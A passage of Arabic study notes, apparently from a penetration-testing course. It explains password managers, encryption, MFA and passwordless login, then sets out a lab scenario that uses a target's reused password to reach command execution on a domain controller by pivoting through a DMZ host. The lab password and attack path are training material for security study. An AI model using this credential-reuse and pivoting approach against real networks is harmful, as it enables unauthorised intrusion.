- يعرف اسم كلبك من فيسبوك 
    

---

## المشكلة الأخيرة: كتر الباسوردات 

- إيميل
    
- لينكدإن
    
- سيستم الشركة
    
- VPN
    
- GitHub
    

مستحيل تحفظهم كلهم

وهنا ييجي الحل 
 **Password Managers**  
وده اللي هيتشرح بعد كده


# Layer 25
## أولاً: ليه محتاج Password Manager أصلاً؟

دلوقتي كل حاجة محتاجة باسورد:

- الواي فاي في البيت 
    
- السوشيال ميديا (فيسبوك، إنستجرام، تويتر)
    
- الحساب البنكي 

- إيميلات العمل 
    
- أي تطبيق أو موقع بتحبه
    

📊 دراسة من **NordPass** بتقول:

> الشخص العادي عنده حوالي 100 باسورد دلوقتي 

النتيجة:

- الناس بتعمل **re-use** للباسوردات
    
- أو بيختاروا كلمات سهلة جدًا
    

الحل:

> كل خدمة لازم ليها **باسورد قوي ومختلف**  
> بس مينفعش نحفظ 100 باسورد قوي في دماغنا 

هنا ييجي دور **Password Manager**

---

## إيه هو Password Manager؟

هو **برنامج بيخزن كل الباسوردات بتاعتك بطريقة مشفرة (Encrypted)**.  
مش بس كده، ده كمان بيعمل حاجات تانية:

- يولد لك باسوردات قوية
    
- يدعم **2FA**
    
- يملأ الفورمات تلقائيًا
    
- يعمل Integration مع البراوزر
    
- يعمل Synchronization على كل الأجهزة
    
- ينبهك لو فيه باسورد اتسرق أو ضعيف
    

---

## إزاي Password Manager بيشتغل؟

### 1️⃣ Master Password

- كل الـ database اللي فيها الباسوردات **بتتقفل بباسورد واحد رئيسي**
    
- ده الباسورد اللي أنت هتحفظه بس
    

### 2️⃣ التشفير (Encryption)

- بيستخدم **cryptographic hash functions** + **key derivation functions**
    
- ده عشان يمنع أي حد يفتح الـ database من غير ما يكون عنده الباسورد الرئيسي
    

---

## أنواع Password Managers

### 🔹 Cloud-based (سحابي)

مميزاته:

- ممكن تستخدمه على **أكثر من جهاز** (موبايل، لاب توب، تابلت...)
    
- عنده:
    
    - تطبيق موبايل
        
    - إضافة للبراوزر
        
    - Sync بين الأجهزة
        
- معظمهم بيشتغل بطريقة **Zero-Knowledge Encryption**:
    
    > حتى الشركة نفسها مش هتعرف باسورداتك
    

**مثال عملي: Bitwarden**

- Master Key → بيتعمل من Master Password
    
- Master Password Hash → للتأكد إنك انت المستخدم
    
- Decryption Key → عشان تفتح الفولط (Vault)
    

📌 باقي Cloud Managers المشهورين:  
1Password، Dashlane، Keeper، LastPass، NordPass، RoboForm

---

### 🔹 Local-based (محلي)

- البيانات كلها على جهازك الشخصي
    
- انت المسؤول عن الأمان والتخزين
    
- مش بيعتمد على cloud
    
- بيستخدم تشفير مشابه للـ Cloud
    
- مميزات إضافية:
    
    - حماية الذاكرة (Memory Protection)
        
    - مقاومة Keylogger
        

**أمثلة:**  
KeePass، KWalletManager، Pleasant Password Server، Password Safe

---

## أهم Features لازم تبص عليها

لو عندك مثلاً:

- Linux + Android + Chrome OS
    
- عايز Passwords و Secure Notes متزامنة
    
- 2FA
    
- Budget $5/Month
    

المميزات اللي تبص عليها:

- دعم **2FA**
    
- Multi-platform
    
- Browser Extension
    
- Login Autocomplete
    
- Import & Export
    
- Password Generation
    

---

## بدائل الباسورد التقليدي

الباسوردات ممكن تتسرق بسهولة:

- Cracking
    
- Guessing
    
- Shoulder Surfing
    

فإيه البدائل؟

- **MFA (Multi-factor Authentication)**
    
- **FIDO2** → Passwordless login بأجهزة زي YubiKey
    
- **OTP / TOTP** → كلمات سر لمرة واحدة
    
- **IP restrictions**
    
- **Device compliance** → أدوات زي Microsoft Endpoint Manager أو Workspace ONE
    

---

## مستقبل بدون باسورد (Passwordless)

- شركات كبيرة زي Microsoft، Auth0، Okta بتدعم الفكرة
    
- بدل ما تعتمد على حاجة انت عارفها (Knowledge Factor) زي الباسورد
    
- بيعتمدوا على حاجة انت معاك (Possession Factor) أو حاجة انت عليها (Inherent Factor)
    

مثال:

- بطاقة USB خاصة (مثل YubiKey)
    
- بصمة / وجه / iris
    

الميزة:

> أمان أعلى + أقل فرصة للتسريب

---

## الخلاصة

- كل واحد محتاج Password Manager لأنه **مستحيل يحفظ كل الباسوردات القوية**
    
- فيه Cloud و Local، كل واحد ليه مميزاته وعيوبه
    
- لازم تبص على المميزات اللي انت محتاجها
    
- فيه بدائل زي MFA و Passwordless لتقليل الاعتماد على الباسورد التقليدي
    

 نصيحة:  
ابدأ بـ **Password Manager قوي + 2FA**، وفكر بعدين في المستقبل Passwordless، ده هيخلي كل حساباتك آمنة وسهلة الإدارة.


# Layer 25
## Skills Assessment Scenario (القصة العملية)

### الشخص المستهدف:

**Betty Jayde**

### المعلومة الخطيرة:

> بتستخدم نفس الباسورد في كذا مكان
> Texas123!@#

### المطلوب:

> توصل لمرحلة  
> **Command Execution على Domain Controller**

يعني:

- مش بس تدخل
    
- لأ، تشغل أوامر على DC
    

---

## الأجهزة الموجودة (Network Layout)

| Host   | Role              |
| ------ | ----------------- |
| DMZ01  | بوابة من الإنترنت |
| JUMP01 | Jump Box          |
| FILE01 | File Server       |
| *DC01* | Domain Controller |

![[Pasted image 20260118181801.png]]

---

## Pivoting Primer – يعني إيه Pivot؟

المشكلة:

- JUMP01
    
- FILE01
    
- DC01
    

❌ مش ظاهرين من الإنترنت

الحل:

> نعدي عليهم من خلال DMZ01

### Pivoting =

تخلي جهاز مخترق:

- يعدي Traffic
    
- كأنه VPN
    
- يوصل للـ Internal Network
    

يعني:

> جهازك الهجومي يشوف الشبكة الداخلية  
> كأنك جوه الشركة

---

## الصورة الكاملة (Mindset)

الهجوم ده بيعلمك:

- التفكير مش الحفظ
    
- ربط الباسوردات بـ AD
    
- إن اختراق واحد صغير  
    → ممكن يوقع شركة كاملة
    

---
